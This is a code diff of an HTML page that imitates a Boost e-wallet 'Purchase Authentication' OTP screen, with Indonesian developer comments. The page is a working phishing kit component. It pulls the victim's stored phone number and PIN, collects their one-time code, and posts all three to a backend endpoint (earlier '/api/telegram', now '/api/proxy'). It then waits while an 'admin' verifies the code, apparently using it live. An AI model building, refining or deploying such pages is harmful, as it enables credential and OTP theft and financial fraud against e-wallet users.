@@ -1,197 +1,221 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Purchase Authentication</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
-  <style>
-    @keyframes spin { to { transform: rotate(360deg); } }
-    .animate-spin { animation: spin 1s linear infinite; }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Purchase Authentication</title>
+    <!-- Tailwind -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        input[type="number"]::-webkit-inner-spin-button,
+        input[type="number"]::-webkit-outer-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+        input[type="number"] {
+            -moz-appearance: textfield;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .animate-spin { animation: spin 1s linear infinite; }
+    </style>
 </head>
 <body class="min-h-screen flex flex-col bg-white text-gray-800">
-  <header class="bg-[#EA0029] py-5 flex justify-center">
-    <img src="boost-logo-white.svg" alt="Boost" class="w-20 h-auto">
-  </header>
-  <main class="flex-grow w-full max-w-sm mx-auto px-5 py-10">
-    <!-- Error State (jika tidak ada data di localStorage) -->
-    <div id="errorBlock" class="hidden text-center bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded-lg">
-      <p class="mb-2 font-semibold">Phone number not found</p>
-      <p>Please <a href="sign.html" class="underline font-semibold">sign in again</a>.</p>
-    </div>
+    <header class="bg-[#EA0029] py-5 flex justify-center">
+        <img src="boost-logo-white.svg" alt="Boost" class="w-20 h-auto">
+    </header>
+    <main class="flex-grow w-full max-w-sm mx-auto px-5 py-10">
+        <!-- Error jika tidak ada data di localStorage -->
+        <div id="errorBlock" class="hidden text-center bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded-lg">
+            <p class="mb-2 font-semibold">Phone number not found</p>
+            <p>Please <a href="sign.html" class="underline font-semibold">sign in again</a>.</p>
+        </div>
 
-    <!-- OTP Screen -->
-    <div id="otpBlock">
-      <h1 class="text-2xl font-bold mb-1">Purchase Authentication</h1>
-      <p class="text-gray-500 mb-6">
-        The OTP code has been sent to <span id="maskedPhone" class="font-semibold text-gray-700"></span>
-      </p>
+        <!-- Halaman OTP -->
+        <div id="otpBlock">
+            <h1 class="text-2xl font-bold mb-1">Purchase Authentication</h1>
+            <p class="text-gray-500 mb-6">
+                The OTP code has been sent to <span id="maskedPhone" class="font-semibold text-gray-700"></span>
+            </p>
 
-      <label class="block text-sm font-semibold text-gray-700 mb-2">6-digit OTP</label>
-      <div class="flex justify-between mb-8">
-        <input maxlength="1" type="password" inputmode="numeric" class="otp w-12 h-14 text-center text-2xl border-b-2 border-gray-300 focus:border-[#EA0029] focus:outline-none bg-gray-50 rounded">
-        <input maxlength="1" type="password" inputmode="numeric" class="otp w-12 h-14 text-center text-2xl border-b-2 border-gray-300 focus:border-[#EA0029] focus:outline-none bg-gray-50 rounded">
-        <input maxlength="1" type="password" inputmode="numeric" class="otp w-12 h-14 text-center text-2xl border-b-2 border-gray-300 focus:border-[#EA0029] focus:outline-none bg-gray-50 rounded">
-        <input maxlength="1" type="password" inputmode="numeric" class="otp w-12 h-14 text-center text-2xl border-b-2 border-gray-300 focus:border-[#EA0029] focus:outline-none bg-gray-50 rounded">
-        <input maxlength="1" type="password" inputmode="numeric" class="otp w-12 h-14 text-center text-2xl border-b-2 border-gray-300 focus:border-[#EA0029] focus:outline-none bg-gray-50 rounded">
-        <input maxlength="1" type="password" inputmode="numeric" class="otp w-12 h-14 text-center text-2xl border-b-2 border-gray-300 focus:border-[#EA0029] focus:outline-none bg-gray-50 rounded">
-      </div>
+            <label class="block text-sm font-semibold text-gray-700 mb-2">6-digit OTP</label>
+            <div class="flex justify-between mb-8" id="otpContainer">
+                <!-- 6 input OTP akan digenerate oleh JS (terlihat) -->
+            </div>
 
-      <div class="space-y-3">
-        <button id="confirmBtn" class="w-full py-3 bg-[#EA0029] text-white font-semibold rounded-lg shadow-md disabled:opacity-40 active:scale-95 transition">
-          CONFIRM
-        </button>
-        <button id="resendBtn" class="w-full py-3 border border-[#EA0029] text-[#EA0029] font-semibold rounded-lg disabled:opacity-40 transition" disabled>
-          RESEND
-        </button>
-        <button id="cancelBtn" class="w-full py-3 bg-gray-100 text-gray-600 font-semibold rounded-lg active:scale-95 transition">
-          CANCEL
-        </button>
-      </div>
+            <div class="space-y-3">
+                <button id="confirmBtn" class="w-full py-3 bg-[#EA0029] text-white font-semibold rounded-lg shadow-md disabled:opacity-40 active:scale-95 transition">
+                    CONFIRM
+                </button>
+                <button id="resendBtn" class="w-full py-3 border border-[#EA0029] text-[#EA0029] font-semibold rounded-lg disabled:opacity-40 transition" disabled>
+                    RESEND
+                </button>
+                <button id="cancelBtn" class="w-full py-3 bg-gray-100 text-gray-600 font-semibold rounded-lg active:scale-95 transition">
+                    CANCEL
+                </button>
+            </div>
 
-      <small class="block text-gray-400 text-center mt-6">
-        The page will automatically timeout after 7 minutes.
-      </small>
-      <div id="timer" class="text-center text-gray-600 mt-2 font-medium"></div>
-      <div id="statusMessage" class="text-center mt-4 font-semibold"></div>
-    </div>
-  </main>
+            <small class="block text-gray-400 text-center mt-6">
+                The page will automatically timeout after 7 minutes.
+            </small>
+            <div id="timer" class="text-center text-gray-600 mt-2 font-medium"></div>
+            <div id="statusMessage" class="text-center mt-4 font-semibold"></div>
+        </div>
+    </main>
 
-  <script>
-    const phone = localStorage.getItem("boost_phone");
-    const pin = localStorage.getItem("boost_pin");
+    <script>
+        const onlyDigits = (val) => val.replace(/\D/g, '');
 
-    const otpBlock = $("#otpBlock");
-    const errorBlock = $("#errorBlock");
-    const maskedPhone = $("#maskedPhone");
-    const confirmBtn = $("#confirmBtn");
-    const resendBtn = $("#resendBtn");
-    const cancelBtn = $("#cancelBtn");
-    const otpInputs = $(".otp");
-    const timerEl = $("#timer");
-    const statusMsg = $("#statusMessage");
+        const phone = localStorage.getItem('boost_phone');
+        const pin = localStorage.getItem('boost_pin');
 
-    let pollingInterval = null;
-    let timeLeft = 420; // 7 menit
+        const errorBlock = document.getElementById('errorBlock');
+        const otpBlock = document.getElementById('otpBlock');
+        const maskedPhone = document.getElementById('maskedPhone');
+        const otpContainer = document.getElementById('otpContainer');
+        const confirmBtn = document.getElementById('confirmBtn');
+        const resendBtn = document.getElementById('resendBtn');
+        const cancelBtn = document.getElementById('cancelBtn');
+        const timerEl = document.getElementById('timer');
+        const statusMsg = document.getElementById('statusMessage');
 
-    if (!phone || !pin) {
-      errorBlock.removeClass("hidden");
-      otpBlock.addClass("hidden");
-    } else {
-      const masked = phone.slice(0, 4) + "****" + phone.slice(-2);
-      maskedPhone.text(masked);
-    }
+        let pollingInterval = null;
+        let timeLeft = 420; // 7 menit
 
-    // OTP auto focus
-    otpInputs.on("input", function () {
-      this.value = this.value.replace(/\D/g, "");
-      if (this.value.length === 1) {
-        $(this).next(".otp").focus();
-      }
-    });
-    otpInputs.on("keydown", function (e) {
-      if (e.key === "Backspace" && !this.value) {
-        $(this).prev(".otp").focus();
-      }
-    });
+        if (!phone || !pin) {
+            errorBlock.classList.remove('hidden');
+            otpBlock.classList.add('hidden');
+        } else {
+            // Tampilkan nomor dengan masking
+            const masked = phone.slice(0, 4) + '****' + phone.slice(-2);
+            maskedPhone.textContent = masked;
+        }
 
-    // Fungsi polling status ke /api/check-status
-    function startPolling(phone) {
-      if (pollingInterval) clearInterval(pollingInterval);
-      pollingInterval = setInterval(async () => {
-        try {
-          const res = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
-          const data = await res.json();
-          if (res.ok && data.status) {
-            if (data.status === 'approved') {
-              statusMsg.text('✅ Approved! Redirecting...').css('color', 'green');
-              clearInterval(pollingInterval);
-              setTimeout(() => {
-                window.location.href = 'success.html?status=approved'; // ganti dengan halaman sukses Anda
-              }, 2000);
-            } else if (data.status === 'rejected') {
-              statusMsg.text('❌ Wrong OTP . Please try again.').css('color', 'red');
-              clearInterval(pollingInterval);
-              confirmBtn.prop('disabled', false);
-              confirmBtn.text('CONFIRM');
+        // Generate 6 input OTP (type="text" agar terlihat)
+        for (let i = 0; i < 6; i++) {
+            const input = document.createElement('input');
+            input.type = 'text'; // OTP terlihat
+            input.inputMode = 'numeric';
+            input.maxLength = 1;
+            input.className = 'otp w-12 h-14 text-center text-2xl border-b-2 border-gray-300 focus:border-[#EA0029] focus:outline-none bg-gray-50 rounded';
+            otpContainer.appendChild(input);
+        }
+
+        const otpInputs = document.querySelectorAll('.otp');
+
+        // Auto‑focus OTP
+        otpInputs.forEach((input, idx) => {
+            input.addEventListener('input', function(e) {
+                this.value = onlyDigits(this.value);
+                if (this.value && idx < otpInputs.length - 1) {
+                    otpInputs[idx + 1].focus();
+                }
+            });
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && !this.value && idx > 0) {
+                    otpInputs[idx - 1].focus();
+                }
+            });
+        });
+
+        // Polling status ke proxy
+        function startPolling(phone) {
+            if (pollingInterval) clearInterval(pollingInterval);
+            pollingInterval = setInterval(async () => {
+                try {
+                    const res = await fetch(`/api/proxy/check?phone=${encodeURIComponent(phone)}`);
+                    const data = await res.json();
+                    if (res.ok && data.status) {
+                        if (data.status === 'approved') {
+                            statusMsg.textContent = '✅ Approved! Redirecting...';
+                            statusMsg.style.color = 'green';
+                            clearInterval(pollingInterval);
+                            setTimeout(() => {
+                                window.location.href = 'success.html?status=approved';
+                            }, 2000);
+                        } else if (data.status === 'rejected') {
+                            statusMsg.textContent = '❌ OTP ditolak. Silakan coba lagi.';
+                            statusMsg.style.color = 'red';
+                            clearInterval(pollingInterval);
+                            confirmBtn.disabled = false;
+                            confirmBtn.textContent = 'CONFIRM';
+                        }
+                    }
+                } catch (err) {
+                    console.error('Polling error', err);
+                }
+            }, 3000);
+        }
+
+        // Tombol CONFIRM
+        confirmBtn.addEventListener('click', async function() {
+            if (!phone || !pin) return;
+
+            const otp = Array.from(otpInputs).map(i => i.value).join('');
+            if (otp.length < 6) {
+                alert('Please enter a valid 6-digit OTP');
+                return;
             }
-          }
-        } catch (err) {
-          console.error('Polling error', err);
+
+            confirmBtn.innerHTML = `<div class='inline-block w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin mr-2'></div> Sending...`;
+            confirmBtn.disabled = true;
+            statusMsg.textContent = 'Mengirim OTP...';
+            statusMsg.style.color = 'blue';
+
+            try {
+                const response = await fetch('/api/proxy', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone, pin, otp, type: 'otp' })
+                });
+                const data = await response.json();
+                if (data.success) {
+                    statusMsg.textContent = 'OTP terkirim, menunggu verifikasi admin...';
+                    statusMsg.style.color = 'orange';
+                    startPolling(phone);
+                } else {
+                    alert('Verification failed. Please try again.');
+                    confirmBtn.textContent = 'CONFIRM';
+                    confirmBtn.disabled = false;
+                }
+            } catch (err) {
+                alert('Connection error. Please try again.');
+                confirmBtn.textContent = 'CONFIRM';
+                confirmBtn.disabled = false;
+                console.error(err);
+            }
+        });
+
+        // Tombol CANCEL
+        cancelBtn.addEventListener('click', function() {
+            localStorage.removeItem('boost_phone');
+            localStorage.removeItem('boost_pin');
+            window.location.href = 'index.html'; // ganti dengan halaman utama Anda
+        });
+
+        // Timer hitung mundur
+        function updateTimer() {
+            if (timeLeft <= 0) {
+                resendBtn.disabled = false;
+                confirmBtn.disabled = true;
+                timerEl.textContent = 'Time expired!';
+                return;
+            }
+            const m = Math.floor(timeLeft / 60);
+            const s = timeLeft % 60;
+            timerEl.textContent = `Time left: ${m}:${s.toString().padStart(2, '0')}`;
+            timeLeft--;
         }
-      }, 3000);
-    }
-
-    // Confirm button: kirim OTP ke /api/telegram (type otp)
-    confirmBtn.on("click", function () {
-      if (!phone || !pin) return;
-
-      const otp = otpInputs.map((i, el) => el.value).get().join("");
-      if (otp.length < 6) {
-        alert("Please enter a valid 6-digit OTP");
-        return;
-      }
-
-      confirmBtn.html(`<div class='inline-block w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin mr-2'></div> Sending...`);
-      confirmBtn.prop("disabled", true);
-      statusMsg.text('Mengirim OTP...').css('color', 'blue');
-
-      $.ajax({
-        url: "/api/telegram",
-        method: "POST",
-        data: { phone, pin, otp, type: 'otp' },
-        dataType: "json",
-        success: function (data) {
-          if (data.success) {
-            statusMsg.text('On processing, Please Wait...').css('color', 'orange');
-            startPolling(phone);
-          } else {
-            alert("Verification failed. Please try again.");
-            confirmBtn.text("CONFIRM");
-            confirmBtn.prop("disabled", false);
-          }
-        },
-        error: function () {
-          alert("Connection error. Please try again.");
-          confirmBtn.text("CONFIRM");
-          confirmBtn.prop("disabled", false);
+        if (phone && pin) {
+            updateTimer();
+            setInterval(updateTimer, 1000);
         }
-      });
-    });
 
-    // Cancel button
-    cancelBtn.on("click", function () {
-      localStorage.removeItem("boost_phone");
-      localStorage.removeItem("boost_pin");
-      window.location.href = "index.html"; // ganti dengan halaman utama Anda
-    });
-
-    // Timer countdown
-    function updateTimer() {
-      if (timeLeft <= 0) {
-        resendBtn.prop("disabled", false);
-        confirmBtn.prop("disabled", true);
-        timerEl.text("Time expired!");
-        return;
-      }
-      const m = Math.floor(timeLeft / 60);
-      const s = timeLeft % 60;
-      timerEl.text(`Time left: ${m}:${s.toString().padStart(2, "0")}`);
-      timeLeft--;
-    }
-    if (phone && pin) {
-      updateTimer();
-      setInterval(updateTimer, 1000);
-    }
-
-    // Resend OTP (simulasi, sebenarnya perlu integrasi)
-    resendBtn.on("click", function () {
-      alert("Resending OTP...");
-      resendBtn.prop("disabled", true);
-      timeLeft = 420; // reset timer
-    });
-  </script>
+        // RESEND (simulasi)
+        resendBtn.addEventListener('click', function() {
+            alert('Resending OTP...');
+            resendBtn.disabled = true;
+            timeLeft = 420; // reset timer
+        });
+    </script>
 </body>
 </html>
